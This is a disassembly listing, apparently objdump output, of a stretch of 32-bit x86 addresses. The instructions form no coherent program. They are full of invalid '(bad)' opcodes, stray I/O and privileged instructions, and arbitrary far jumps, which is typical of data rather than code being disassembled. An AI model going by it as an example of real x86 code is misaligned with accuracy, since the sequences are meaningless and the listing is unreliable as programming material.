  4255e3:	adc    eax,0xe4af8336
  4255e8:	mov    ch,0x6c
  4255ea:	sbb    al,0xc2
  4255ec:	inc    ecx
  4255ed:	sub    eax,0xf379c79a
  4255f2:	cdq    
  4255f3:	mov    ch,0xba
  4255f5:	dec    ecx
  4255f6:	test   DWORD PTR [esi],0xb6876c2f
  4255fc:	and    BYTE PTR [ebp-0x5362ea39],ah
  425602:	mov    WORD PTR ss:[edx-0x80],gs
  425606:	cmp    DWORD PTR [eax+0x67773d2c],esi
  42560c:	dec    ecx
  42560d:	or     DWORD PTR [edx-0x4a],0x9503c670
  425614:	pop    ebp
  425615:	sub    dl,cl
  425617:	sub    eax,0x8052001a
  42561c:	jl     0x4255a4
  42561e:	or     bl,BYTE PTR [ebx]
  425620:	push   esi
  425621:	mov    ds:0x40f03832,eax
  425626:	ins    BYTE PTR es:[edi],dx
  425627:	push   ebp
  425628:	std    
  425629:	mov    bh,0xed
  42562b:	rol    DWORD PTR [edx-0xcea9e8f],cl
  425631:	dec    esp
  425632:	dec    edx
  425633:	aaa    
  425634:	and    eax,0x73cbc60e
  425639:	push   si
  42563b:	neg    DWORD PTR [edi]
  42563d:	add    BYTE PTR [eax],bh
  42563f:	sbb    al,0x43
  425641:	imul   edi,esp,0x9dd81ac9
  425647:	add    DWORD PTR [edx+0x3e92b6b9],edx
  42564d:	stos   BYTE PTR es:[edi],al
  42564e:	in     al,dx
  42564f:	inc    ecx
  425650:	mov    ah,0x4
  425652:	(bad)
  425655:	in     al,0x72
  425657:	in     al,dx
  425658:	fnstsw WORD PTR [ebx]
  42565a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42565b:	int    0xd3
  42565d:	addr16 (bad) 
  42565f:	jnp    0x4256ab
  425661:	mov    eax,ds:0x10318b2b
  425666:	inc    eax
  425667:	inc    edx
  425668:	and    al,0xae
  42566a:	ins    BYTE PTR es:[edi],dx
  42566b:	push   cs
  42566c:	push   esp
  42566d:	aas    
  42566e:	popa   
  42566f:	adc    DWORD PTR [eax+0x36],esi
  425672:	pusha  
  425673:	dec    edi
  425674:	pop    ss
  425675:	out    0xb6,al
  425677:	pop    eax
  425678:	add    ch,0xe3
  42567b:	add    dl,BYTE PTR [ecx]
  42567d:	idiv   DWORD PTR [edx]
  42567f:	push   ds
  425680:	rol    DWORD PTR [edi],cl
  425682:	mov    ch,0x80
  425684:	push   0xffffffbd
  425686:	ds mov eax,0xba0b8cda
  42568c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42568d:	and    dl,ch
  42568f:	or     eax,0xf5096310
  425694:	cli    
  425695:	xor    esp,0x73cda88
  42569b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42569c:	fdiv   DWORD PTR [ebx-0x34]
  42569f:	mov    cl,0x3e
  4256a1:	fcom   QWORD PTR [ebx]
  4256a3:	push   ebp
  4256a4:	lock pop ecx
  4256a6:	lahf   
  4256a7:	lods   eax,DWORD PTR ds:[esi]
  4256a8:	into   
  4256a9:	sub    eax,0x9ac1d53
  4256ae:	push   eax
  4256af:	jns    0x42566b
  4256b1:	dec    edi
  4256b2:	into   
  4256b3:	sbb    ebx,esp
  4256b5:	inc    edi
  4256b6:	pop    esp
  4256b7:	adc    al,0x9e
  4256b9:	pop    esp
  4256ba:	xchg   esp,eax
  4256bb:	stos   DWORD PTR es:[edi],eax
  4256bc:	bnd cs je 0x425723
  4256c0:	out    0xd4,al
  4256c2:	adc    BYTE PTR [ebx+0x7ba1eea4],dh
  4256c8:	mov    ?,WORD PTR [eax-0x59]
  4256cb:	mov    dh,0xcc
  4256cd:	dec    esi
  4256ce:	mov    bl,BYTE PTR [ecx*8+0x6294aa4c]
  4256d5:	cmp    DWORD PTR [edx+0x60],edi
  4256d8:	js     0x425744
  4256da:	sti    
  4256db:	jns    0x425699
  4256dd:	retf   0x68e
  4256e0:	jp     0x4256b2
  4256e2:	jmp    0x425700
  4256e4:	and    ebx,DWORD PTR [ebx-0x2c]
  4256e7:	rol    DWORD PTR [edi+edx*1],cl
  4256ea:	dec    esp
  4256eb:	xor    bl,ch
  4256ed:	fstp   TBYTE PTR [edi]
  4256ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4256f0:	xchg   esi,eax
  4256f1:	jae    0x4256ee
  4256f3:	lea    edi,[esi+0x3f]
  4256f6:	push   cs
  4256f7:	adc    esp,DWORD PTR [edx+0x21]
  4256fa:	jbe    0x42571b
  4256fc:	add    BYTE PTR [ebp*1-0x39e358c8],bh
  425703:	mov    bl,0x85
  425705:	(bad)  
  425706:	or     al,0xc6
  425708:	jns    0x425710
  42570a:	into   
  42570b:	dec    esp
  42570c:	xchg   edx,eax
  42570d:	sbb    esp,DWORD PTR [eax-0x3d275647]
  425713:	jae    0x4256e7
  425715:	scas   al,BYTE PTR es:[edi]
  425716:	dec    edx
  425717:	mov    ds:0x30adba71,al
  42571c:	in     eax,0xb8
  42571e:	push   ds
  42571f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425720:	and    DWORD PTR [ecx-0x7824b77c],eax
  425726:	jmp    0x4256c7
  425728:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425729:	fucomi st,st(4)
  42572b:	mov    eax,0x59601ec2
  425730:	xchg   ebx,eax
  425731:	cdq    
  425732:	mov    ah,0x40
  425734:	mov    cl,0xbe
  425736:	dec    eax
  425737:	add    al,0x2e
  42573a:	sub    esi,DWORD PTR [ebx]
  42573c:	out    dx,al
  42573d:	mov    WORD PTR [esi+0x6a80a055],?
  425743:	add    ah,BYTE PTR [ecx]
  425745:	mov    edi,0x4dd14ce6
  42574a:	mov    ch,0x39
  42574c:	ret    0xd656
  42574f:	inc    ebp
  425750:	retf   
  425751:	sub    BYTE PTR [eax],dl
  425753:	mov    ss,eax
  425755:	shl    BYTE PTR [ebx-0x67ec658e],1
  42575b:	mov    edi,0xd0633eb9
  425760:	cmp    BYTE PTR [edx+0x6af3c533],ah
  425766:	sbb    ebp,edx
  425768:	cdq    
  425769:	fdivr  DWORD PTR [eax-0x61]
  42576c:	jmp    0x4257d4
  42576e:	lds    esi,FWORD PTR [ebx]
  425770:	mov    ch,dl
  425772:	sub    BYTE PTR ds:[ecx-0x4473601],0xc9
  42577a:	xor    esi,esi
  42577c:	retf   
  42577d:	add    ah,BYTE PTR [edx+edi*1-0x3]
  425781:	inc    ecx
  425782:	xchg   esi,eax
  425783:	sub    DWORD PTR [eax-0x1cca5f77],esi
  425789:	push   ecx
  42578a:	cmp    dh,BYTE PTR [ebx]
  42578c:	ins    BYTE PTR es:[edi],dx
  42578d:	cmp    DWORD PTR [edi+0x6d],esi
  425790:	aaa    
  425791:	cmp    esp,eax
  425793:	xchg   ebx,eax
  425794:	mov    edx,0xe739625b
  425799:	dec    esi
  42579a:	mov    bh,0xe3
  42579c:	retf   0x75cc
  42579f:	mov    edi,0x84acff2a
  4257a4:	out    dx,al
  4257a5:	mov    edx,0xd9004839
  4257aa:	in     eax,0xb9
  4257ac:	pop    edi
  4257ad:	mov    ebp,DWORD PTR [ebx-0x73ed107b]
  4257b3:	mov    al,0x75
  4257b5:	pop    eax
  4257b6:	push   esi
  4257b7:	pop    ecx
  4257b8:	xchg   esp,ecx
  4257ba:	jnp    0x425836
  4257bc:	pop    ebp
  4257bd:	rcr    bh,0xcd
  4257c0:	lea    eax,[edx+0x46]
  4257c3:	shr    DWORD PTR [edx-0x43520eb6],1
  4257c9:	push   0x7
  4257cb:	rcr    DWORD PTR ds:0x22e45d06,0xd1
  4257d2:	push   esp
  4257d3:	adc    eax,eax
  4257d5:	fwait
  4257d6:	hlt    
  4257d7:	adc    al,0xb1
  4257d9:	mov    esi,0xb60573cb
  4257de:	sbb    eax,0xc87fabb4
  4257e3:	and    BYTE PTR [ebx],0xab
  4257e6:	ror    BYTE PTR [ebx-0x43f82c40],1
  4257ec:	aam    0x71
  4257ee:	inc    eax
  4257ef:	inc    ebp
  4257f0:	adc    bl,BYTE PTR [edi+0x74]
  4257f3:	add    edx,DWORD PTR [eax-0x25]
  4257f6:	xor    al,0xf9
  4257f8:	je     0x4257e3
  4257fa:	dec    ebp
  4257fb:	aam    0x72
  4257fd:	test   DWORD PTR [esi-0x60d67702],eax
  425803:	pop    eax
  425804:	mov    ds:0x225b562b,al
  425809:	in     al,0x9
  42580b:	cs icebp 
  42580d:	nop
  42580e:	mov    esp,0xc4183be4
  425813:	sbb    DWORD PTR [edx-0x73],edx
  425816:	aad    0x4c
  425818:	jl     0x425882
  42581a:	call   0xa1b2:0xe5d0aec0
  425821:	(bad)  
  425822:	dec    ebp
  425823:	cli    
  425824:	cli    
  425825:	or     eax,0x667362b7
  42582a:	fidivr DWORD PTR [esi+eiz*1-0x80]
  42582e:	mov    ds:0xad82872a,al
  425833:	aam    0x4
  425835:	jb     0x4257fb
  425837:	outs   dx,DWORD PTR ds:[esi]
  425838:	cld    
  425839:	sbb    BYTE PTR ds:0xeb7719fe,bl
  42583f:	loope  0x425817
  425841:	ins    DWORD PTR es:[edi],dx
  425842:	jmp    0x2222:0x75d0252f
  425849:	xchg   BYTE PTR [edi],bl
  42584b:	fidiv  DWORD PTR [ecx]
  42584d:	push   esp
  42584e:	scas   eax,DWORD PTR es:[edi]
  42584f:	sub    eax,0xd70c44df
  425854:	ins    DWORD PTR es:[edi],dx
  425855:	pushf  
  425856:	push   edi
  425857:	stos   BYTE PTR es:[edi],al
  425858:	xchg   esi,eax
  425859:	mov    ds:0x28f8c81d,al
  42585e:	std    
  42585f:	clc    
  425860:	mov    BYTE PTR fs:[ebx+edx*1-0x4b],0x8c
  425866:	enter  0x5820,0xd2
  42586a:	inc    eax
  42586b:	rcr    eax,cl
  42586d:	pop    ecx
  42586e:	xor    ebx,DWORD PTR [esi-0x25f1e3a7]
  425874:	mov    eax,ds:0x5fda6535
  425879:	daa    
  42587a:	xor    eax,0xa6eed7fd
  42587f:	scas   al,BYTE PTR es:[edi]
  425880:	imul   DWORD PTR [ebp-0x24c0e2be]
  425886:	outs   dx,DWORD PTR ds:[esi]
  425887:	in     eax,0x17
  425889:	mov    al,0xc0
  42588b:	cld    
  42588c:	sar    DWORD PTR [eax-0x71fb42b9],1
  425892:	fwait
  425893:	mov    WORD PTR ds:0x66f2e614,cs
  425899:	mov    ch,0x16
  42589b:	leave  
  42589c:	call   0x8aad1e93
  4258a1:	xor    BYTE PTR [edi],ch
  4258a3:	jb     0x425868
  4258a5:	xchg   ebp,eax
  4258a6:	dec    ebx
  4258a7:	(bad)  
  4258a8:	sub    DWORD PTR ds:[edx],ebp
  4258ab:	mov    dh,0x13
  4258ad:	jb     0x4258f7
  4258af:	add    al,0xa0
  4258b1:	test   al,0xca
  4258b3:	cld    
  4258b4:	arpl   WORD PTR [ebx+0x2a],dx
  4258b7:	adc    eax,0xf06cea44
  4258bc:	test   cl,bl
  4258be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4258bf:	dec    edi
  4258c0:	jbe    0x425862
  4258c2:	fwait
  4258c3:	and    BYTE PTR [eax+eiz*1-0x20],bl
  4258c7:	inc    ebx
  4258c8:	ret    
  4258c9:	fwait
  4258ca:	add    dl,dh
  4258cc:	fxtract 
  4258ce:	add    DWORD PTR [eax-0x38049433],eax
  4258d4:	xchg   edx,eax
  4258d5:	push   cs
  4258d6:	adc    esp,DWORD PTR [eax]
  4258d8:	xchg   esp,eax
  4258d9:	and    DWORD PTR [ecx+0x63503966],edi
  4258df:	arpl   WORD PTR [ecx+0x78],bx
  4258e2:	(bad)  
  4258e3:	iret   
  4258e4:	sbb    DWORD PTR [ecx-0x7439d9f6],esp
  4258ea:	(bad)  [edx]
  4258ec:	(bad)  
  4258ed:	cs add eax,0x8d808682
  4258f3:	jne    0x42595b
  4258f5:	add    edi,esp
  4258f7:	pop    eax
  4258f8:	mov    BYTE PTR [esi],cl
  4258fa:	adc    esp,DWORD PTR [ebx]
  4258fc:	or     dl,0x7f
  4258ff:	mov    ch,0x46
  425901:	pop    esi
  425902:	adc    al,0x2b
  425904:	mov    cl,0x49
  425906:	out    dx,al
  425907:	dec    esp
  425908:	mov    ds:0xc2476edd,al
  42590d:	xor    dl,BYTE PTR [eax+esi*4]
  425910:	cdq    
  425911:	repnz and DWORD PTR [ecx],ebp
  425914:	sbb    DWORD PTR [ecx-0x73],eax
  425917:	aas    
  425918:	int    0xf8
  42591a:	cli    
  42591b:	and    esp,esp
  42591d:	mov    ebp,0xe7c5752c
  425922:	push   0xb3e25861
  425927:	mov    ds:0x63020ded,al
  42592c:	add    eax,0xe8cda43b
  425931:	jl     0x4258cf
  425933:	pop    edi
  425934:	icebp  
  425935:	scas   eax,DWORD PTR es:[edi]
  425936:	call   0xb558:0xfcd8db82
  42593d:	xor    edi,esp
  42593f:	stos   DWORD PTR es:[edi],eax
  425940:	fldenv [edi-0xf862993]
  425946:	gs inc eax
  425948:	sbb    ebp,esp
  42594a:	rcr    esi,0xd
  42594d:	cmp    al,0x8a
  42594f:	in     al,0x7a
  425951:	cmp    bh,ch
  425953:	mov    dh,0x8a
  425955:	sbb    al,0x39
  425957:	(bad)  
  425958:	inc    BYTE PTR [ebp+ecx*2-0x76]
  42595c:	test   BYTE PTR [esi],0xb7
  42595f:	push   ebx
  425960:	in     al,0xab
  425962:	cmp    al,0xb1
  425964:	fidivr DWORD PTR [edx+0x11]
  425967:	sbb    cl,cl
  425969:	in     al,0x73
  42596b:	xlat   BYTE PTR ds:[ebx]
  42596c:	add    al,0xf0
  42596e:	push   eax
  42596f:	or     DWORD PTR [ebx],eax
  425971:	inc    esp
  425972:	repz dec edx
  425974:	(bad)  
  425975:	out    dx,eax
  425976:	and    DWORD PTR [eax],ebx
  425978:	mov    BYTE PTR [eax+0xa5cfbaf],ah
  42597e:	push   es
  42597f:	sbb    ecx,DWORD PTR [edx-0x61]
  425982:	inc    ebx
  425983:	les    esi,FWORD PTR [edi]
  425985:	addr16 push ebp
  425987:	mov    esp,0xb2887a9a
  42598c:	test   al,0x83
  42598e:	aam    0xc5
  425990:	outs   dx,DWORD PTR ds:[esi]
  425991:	data16 scas al,BYTE PTR es:[edi]
  425993:	xchg   esi,eax
  425994:	dec    edx
  425995:	fnstcw WORD PTR ds:0x29469c9
  42599b:	sbb    DWORD PTR [edi+0x71b4ca8f],0x2a9a6c23
  4259a5:	mov    es,WORD PTR [ebp-0x4e]
  4259a8:	popf   
  4259a9:	xchg   ecx,eax
  4259aa:	lahf   
  4259ab:	ds into 
  4259ad:	and    BYTE PTR [di+0x70],ah
  4259b1:	pushf  
  4259b2:	sti    
  4259b3:	lahf   
  4259b4:	mov    ah,0x96
  4259b6:	pusha  
  4259b7:	or     DWORD PTR [esi],esi
  4259b9:	cmp    BYTE PTR [edx+0x1d],bl
  4259bc:	mov    bl,BYTE PTR [edx+0x1d97e908]
  4259c2:	cld    
  4259c3:	sbb    BYTE PTR [esi],0xf7
  4259c6:	mul    DWORD PTR [ebp+0x15]
  4259c9:	mov    ebx,eax
  4259cb:	mov    ebp,0x83ea5da2
  4259d0:	pop    ss
  4259d1:	into   
  4259d2:	mov    ebx,0xc2760a92
  4259d7:	pop    edx
  4259d8:	mov    ds:0x47b4aaf0,eax
  4259dd:	jns    0x425a5c
  4259df:	iret   
  4259e0:	adc    BYTE PTR [ecx],ah
  4259e2:	mov    edx,0xe2e622
  4259e7:	jne    0x425a5b
  4259e9:	jp     0x425a18
  4259eb:	test   eax,0x5c3e21c3
  4259f0:	adc    BYTE PTR [esi+0x18e1a342],bh
  4259f6:	pop    ds
  4259f7:	jmp    0x800f:0x48f8d1a9
  4259fe:	inc    edx
  4259ff:	xor    eax,0x7a3684a6
  425a04:	cli    
  425a05:	sbb    al,0x1c
  425a07:	ret    0xb967
  425a0a:	dec    ebx
  425a0b:	push   0x544047a0
  425a10:	sti    
  425a11:	xchg   ebx,eax
  425a12:	popf   
  425a13:	mov    esi,0x2177d07d
  425a18:	and    DWORD PTR [eax-0x1402debb],0x1b
  425a1f:	mov    ebx,DWORD PTR [ebx]
  425a21:	jns    0x4259df
  425a23:	mov    esi,0x3bcdf5a8
  425a28:	sub    al,0x32
  425a2a:	pop    esp
  425a2b:	xchg   ecx,eax
  425a2c:	clc    
  425a2d:	lahf   
  425a2e:	test   al,0x14
  425a31:	fwait
  425a32:	pop    es
  425a33:	call   0xa109cc95
  425a38:	and    BYTE PTR [edi+ebx*8-0x6f],bh
  425a3c:	pop    ecx
  425a3d:	pop    ebx
  425a3e:	pop    ss
  425a3f:	sub    eax,DWORD PTR [edx+0x664c62cd]
  425a45:	pop    edx
  425a46:	stos   BYTE PTR es:[edi],al
  425a47:	adc    DWORD PTR [eax+edx*4+0x4dd65d53],0x57
  425a4f:	cmp    dh,BYTE PTR [ecx+edi*1+0x1]
  425a53:	xchg   ecx,eax
  425a54:	adc    al,0xd9
  425a56:	addr16 sbb al,0x5
  425a59:	call   0x3a6f5752
  425a5e:	adc    al,0x57
  425a60:	jb     0x425a4d
  425a62:	idiv   DWORD PTR [edx+0x59627f4d]
  425a68:	sub    eax,DWORD PTR [ecx]
  425a6a:	jmp    0x425aad
  425a6c:	outs   dx,DWORD PTR ds:[esi]
  425a6d:	xchg   ecx,eax
  425a6e:	rcl    BYTE PTR [ebp-0x436df6aa],1
  425a74:	jns    0x425a19
  425a76:	aaa    
  425a77:	pause  
  425a79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a7a:	int3   
  425a7b:	cwde   
  425a7c:	jbe    0x425a7d
  425a7e:	push   ebx
  425a7f:	mov    ecx,0x9d2c2afc
  425a84:	enter  0x2625,0x17
  425a88:	add    dh,dh
  425a8a:	and    esp,DWORD PTR [ebx+0x61add16f]
  425a90:	ins    BYTE PTR es:[edi],dx
  425a91:	adc    eax,0x2563edf4
  425a96:	and    DWORD PTR [ebx-0x782fb986],ebx
  425a9c:	jmp    0x85424253
  425aa1:	jnp    0x425b1c
  425aa3:	in     al,dx
  425aa4:	fs aad 0xa6
  425aa7:	cmp    DWORD PTR ds:0xefef02d,eax
  425aad:	dec    ebp
  425aae:	or     edx,DWORD PTR [ebx-0xc]
  425ab1:	in     eax,0x6a
  425ab3:	or     ah,bh
  425ab5:	lods   al,BYTE PTR ds:[esi]
  425ab6:	cmp    al,0xf3
  425ab8:	dec    ecx
  425ab9:	std    
  425aba:	fs pop esp
  425abc:	js     0x425a44
  425abe:	test   al,0x17
  425ac0:	retf   0xd94
  425ac3:	cmp    eax,esi
  425ac5:	sub    DWORD PTR [edx],ecx
  425ac7:	cmc    
  425ac8:	lds    ecx,FWORD PTR [edx+0x74]
  425acb:	sbb    eax,0xe23c666a
  425ad0:	pop    eax
  425ad1:	adc    DWORD PTR [ecx-0x7c],eax
  425ad4:	xlat   BYTE PTR ds:[ebx]
  425ad5:	add    edi,DWORD PTR [edx-0x22cbda2d]
  425adb:	sub    BYTE PTR [edx+eiz*8+0x1d],ch
  425adf:	inc    eax
  425ae0:	cwde   
  425ae1:	cwde   
  425ae2:	outs   dx,BYTE PTR ds:[esi]
  425ae3:	aad    0xf5
  425ae5:	adc    BYTE PTR [ebp-0x3475badc],ah
  425aeb:	shr    BYTE PTR fs:[ebp-0x49],0x20
  425af0:	jecxz  0x425a9d
  425af2:	jle    0x425aa1
  425af4:	cmp    DWORD PTR [ebx-0x1b064b67],ebx
  425afa:	and    edx,edx
  425afc:	xor    BYTE PTR [edi+ebp*2+0x0],dl
  425b00:	cmp    eax,0xd1a3a47f
  425b05:	loopne 0x425b3c
  425b07:	xor    eax,0xfa605b48
  425b0c:	in     al,dx
  425b0d:	jno    0x425b71
  425b0f:	mov    esp,0x7d5b5db7
  425b14:	mov    ecx,0x8149f4ce
  425b19:	and    bl,bl
  425b1b:	and    BYTE PTR [esi+ebp*4],0xf4
  425b1f:	popa   
  425b20:	mov    al,ds:0xebdcb081
  425b25:	scas   eax,DWORD PTR es:[edi]
  425b26:	data16 aaa 
  425b28:	repnz pusha 
  425b2a:	sub    esp,DWORD PTR [ebx]
  425b2c:	fs out dx,al
  425b2e:	jbe    0x425b88
  425b30:	lods   al,BYTE PTR ds:[esi]
  425b31:	add    DWORD PTR [ebp-0x5c],0x6a
  425b35:	xchg   DWORD PTR [ebp+0x4cd114a],ebx
  425b3b:	retf   
  425b3c:	xchg   dl,bh
  425b3e:	and    DWORD PTR [ecx],ecx
  425b40:	xor    al,0xed
  425b42:	je     0x425b51
  425b44:	xor    al,0xac
  425b46:	cli    
  425b47:	ficomp WORD PTR [esi]
  425b49:	adc    cl,bh
  425b4b:	imul   esp,DWORD PTR [ecx-0x7a],0x99f6b795
  425b52:	loopne 0x425bc2
  425b54:	mov    ds:0x70c5686a,al
  425b59:	icebp  
  425b5a:	(bad)  
  425b5b:	int    0x38
  425b5d:	xchg   edi,eax
  425b5e:	or     DWORD PTR [eax-0x65a646c],ecx
  425b64:	sub    al,0x49
  425b66:	and    cl,dl
  425b68:	add    bh,dl
  425b6a:	test   al,0x1b
  425b6c:	fcomi  st,st(1)
  425b6e:	mov    cl,0xc3
  425b70:	bound  ebp,QWORD PTR [eax+0x61]
  425b73:	out    0x96,al
  425b75:	xchg   edx,edx
  425b77:	mov    ds:0x56f384d6,eax
  425b7c:	jl     0x425b5c
  425b7e:	lahf   
  425b7f:	int    0xfe
  425b81:	push   ecx
  425b82:	inc    esi
  425b83:	in     eax,dx
  425b84:	call   0x3811:0x62d397a5
  425b8b:	lea    eax,[esi+0x731ff40e]
  425b91:	addr16 mov cl,0x97
  425b94:	xor    dl,ah
  425b96:	shl    BYTE PTR [ecx+0x7f],cl
  425b99:	jl     0x425b21
  425b9b:	imul   ecx,esp,0x5a
  425b9e:	cdq    
  425b9f:	in     al,0x86
  425ba1:	sbb    al,0x8c
  425ba3:	mov    ebp,0x422793de
  425ba8:	int    0xbf
  425baa:	js     0x425bc9
  425bac:	dec    ebp
  425bad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425bae:	sub    BYTE PTR [edi-0x57],0x98
  425bb2:	sbb    ch,bh
  425bb4:	arpl   WORD PTR [ebx+0xd285ec9],cx
  425bba:	outs   dx,BYTE PTR ds:[esi]
  425bbb:	mov    WORD PTR [edi],ds
  425bbd:	dec    ecx
  425bbe:	fwait
  425bbf:	data16 adc al,0x67
  425bc2:	lock cmp BYTE PTR [ecx-0x26],dh
  425bc6:	popa   
  425bc7:	out    0xe9,eax
  425bc9:	add    ah,bh
  425bcb:	push   edx
  425bcc:	xor    DWORD PTR [esp+eax*4],0x36521f7b
  425bd3:	stos   BYTE PTR es:[edi],al
  425bd4:	xchg   ebp,eax
  425bd5:	pop    eax
  425bd6:	repz rcl DWORD PTR [esi-0x75],0x8b
  425bdb:	and    BYTE PTR [eax+ebp*4],bl
  425bde:	sti    
  425bdf:	or     eax,0xb4e4f728
  425be4:	aam    0xb7
  425be6:	jmp    0x425c5d
  425be8:	fist   WORD PTR [eax+0x7f006a6]
  425bee:	mov    dl,0x4b
  425bf0:	jno    0x425c6b
  425bf2:	inc    ebp
  425bf3:	pop    ds
  425bf4:	test   al,0x47
  425bf6:	sar    DWORD PTR [ecx-0x9385883],1
  425bfc:	(bad)  
  425bfd:	fdiv   st,st(7)
  425bff:	fsincos 
  425c01:	lds    edi,FWORD PTR [ebx+0x3d]
  425c04:	adc    al,0x13
  425c06:	mov    bh,0xa2
  425c08:	addr16 jb 0x425bdd
  425c0b:	cmp    dh,cl
  425c0d:	mov    ds:0x4922b84a,eax
  425c12:	xchg   edx,eax
  425c13:	pop    es
  425c14:	(bad)  
  425c15:	fsubr  QWORD PTR [esi]
  425c17:	cli    
  425c18:	arpl   WORD PTR [edi+0x39930867],ax
  425c1e:	(bad)
  425c21:	sub    esi,DWORD PTR [ebp-0x6e8326a9]
  425c27:	mov    ch,0x88
  425c29:	adc    ah,BYTE PTR [edi]
  425c2b:	jns    0x425bcf
  425c2d:	or     ah,0x7d
  425c30:	fild   DWORD PTR [edi-0x4499f388]
  425c36:	dec    esp
  425c37:	mov    al,ds:0xa64d19c5
  425c3c:	mov    ch,0x3c
  425c3e:	jmp    0x1331:0x3acff5c3
  425c45:	lds    edx,FWORD PTR [esi+ebx*4+0x68aa2a17]
  425c4c:	xchg   edi,eax
  425c4d:	push   eax
  425c4e:	das    
  425c4f:	dec    esp
  425c50:	xor    edi,esi
  425c52:	inc    DWORD PTR [ecx+0x5c]
  425c55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c56:	sub    ebx,DWORD PTR [edi]
  425c58:	retf   0xf0cb
  425c5b:	into   
  425c5c:	fwait
  425c5d:	add    esi,ebp
  425c5f:	jle    0x425c5c
  425c61:	inc    ecx
  425c62:	les    edx,FWORD PTR [edi-0x3d160002]
  425c68:	adc    ebx,edi
  425c6a:	fstp   st(4)
  425c6c:	sub    al,0x38
  425c6e:	push   eax
  425c6f:	cmp    al,0xe
  425c71:	mov    dh,0xc2
  425c73:	out    dx,al
  425c74:	add    eax,0x15008625
  425c79:	into   
  425c7a:	test   DWORD PTR [eax-0x69cca700],0x54b040e5
  425c84:	mov    WORD PTR [esi],?
  425c86:	pushf  
  425c87:	fs (bad) 
  425c89:	outs   dx,BYTE PTR ds:[esi]
  425c8a:	mov    edi,0xe97a65ce
  425c8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c90:	adc    edx,DWORD PTR [ebx]
  425c92:	adc    BYTE PTR [ebp+0x7b],0xc3
  425c96:	mov    WORD PTR fs:[ebp+eax*1+0x0],gs
	...
  425d13:	add    dh,ah
  425d15:	rcl    BYTE PTR [ecx+esi*8-0x2818084c],cl
  425d1c:	aad    0x75
  425d1e:	(bad)  
  425d1f:	adc    DWORD PTR [ebx-0x4603003],esp
  425d25:	out    dx,eax
  425d26:	add    DWORD PTR [eax],eax
  425d28:	outs   dx,BYTE PTR ds:[esi]
  425d29:	pop    es
  425d2a:	add    BYTE PTR [eax],al
  425d2c:	bound  eax,QWORD PTR [ecx]
  425d2e:	out    0xe9,al
  425d30:	call   0xc1ff7ee1
  425d35:	mov    ebx,0x4f1ef2f4
  425d3a:	(bad)  
  425d3b:	fwait
  425d3c:	ret    0xbbf6
  425d3f:	and    esp,DWORD PTR [esi+ebp*2+0x50c8cb14]
  425d46:	retf   0xe2a1
  425d49:	push   ds
  425d4a:	iret   
  425d4b:	sub    DWORD PTR ds:0x90f587ec,ecx
  425d51:	xchg   DWORD PTR [ebp-0x3658f8ac],eax
  425d57:	or     BYTE PTR [edx-0x4c],dl
  425d5a:	in     eax,dx
  425d5b:	aad    0x27
  425d5d:	or     eax,0xa2dbbfe6
  425d62:	int    0xd4
  425d64:	outs   dx,BYTE PTR ds:[esi]
  425d65:	std    
  425d66:	inc    edi
  425d67:	inc    edi
  425d68:	aaa    
  425d69:	mov    edi,0x2d257c58
  425d6e:	push   ebp
  425d6f:	and    BYTE PTR [edx],bl
  425d71:	xor    al,0x4d
  425d73:	data16 in al,dx
  425d75:	sbb    BYTE PTR [eax],0x4a
  425d78:	ds mov ecx,0x61eae49d
  425d7e:	leave  
  425d7f:	loopne 0x425d24
  425d81:	pop    esp
  425d82:	stos   DWORD PTR es:[edi],eax
  425d83:	pop    esp
  425d84:	fbld   TBYTE PTR [ebp+0x24525392]
  425d8a:	fnsetpm(287 only) 
  425d8c:	outs   dx,DWORD PTR ds:[esi]
  425d8d:	repz (bad) 
  425d8f:	popf   
  425d90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d91:	retf   
  425d92:	mov    DWORD PTR [edi-0x415f4d53],ebx
  425d98:	clc    
  425d99:	js     0x425d68
  425d9b:	and    eax,0x34d919e1
  425da0:	rol    DWORD PTR [edx],cl
  425da2:	lds    esi,FWORD PTR [esi+0x3ff80b1f]
  425da8:	iret   
  425da9:	pop    esi
  425daa:	lds    edx,FWORD PTR [eax-0x6d7b79b4]
  425db0:	jl     0x425d5f
  425db2:	add    dl,bh
  425db4:	and    bl,al
  425db6:	sub    BYTE PTR [ebp+0x6249a29],bh
  425dbc:	jno    0x425dcc
  425dbe:	adc    edi,DWORD PTR [esi+0x31647f30]
  425dc4:	scas   al,BYTE PTR es:[edi]
  425dc5:	adc    eax,0x3f96ddee
  425dca:	inc    edx
  425dcb:	icebp  
  425dcc:	stos   BYTE PTR es:[edi],al
  425dcd:	fidiv  DWORD PTR [edi]
  425dcf:	or     cl,0xff
  425dd2:	mov    ecx,edx
  425dd4:	lea    esi,[ebx]
  425dd6:	outs   dx,DWORD PTR ds:[esi]
  425dd7:	add    al,dl
  425dd9:	pop    es
  425dda:	fimul  WORD PTR [edi]
  425ddc:	mov    eax,0x277ee583
  425de1:	hlt    
  425de2:	daa    
  425de3:	pop    ebx
  425de4:	or     ebx,DWORD PTR [eax]
  425de6:	jae    0x425e5c
  425de8:	rcl    BYTE PTR [ebx+eax*4+0x3],cl
  425dec:	xor    esi,DWORD PTR [edi+0x3831b76e]
  425df2:	cs xchg esi,eax
  425df4:	mov    ch,0x58
  425df6:	outs   dx,BYTE PTR ds:[esi]
  425df7:	call   0x5245a5da
  425dfc:	addr16 (bad) 
  425dfe:	stos   DWORD PTR es:[edi],eax
  425dff:	or     BYTE PTR [edi],0xdf
  425e02:	mov    ecx,0xfb1b6e29
  425e07:	mov    DWORD PTR [ecx],eax
  425e09:	jne    0x425e77
  425e0b:	sbb    bh,ch
  425e0d:	xchg   esp,eax
  425e0e:	aad    0xc3
  425e10:	pop    eax
  425e11:	in     eax,0xd0
  425e13:	xor    esi,esi
  425e15:	dec    ebp
  425e16:	add    ebp,DWORD PTR [edx]
  425e18:	inc    eax
  425e19:	test   DWORD PTR ss:[esi+0x4a],ebp
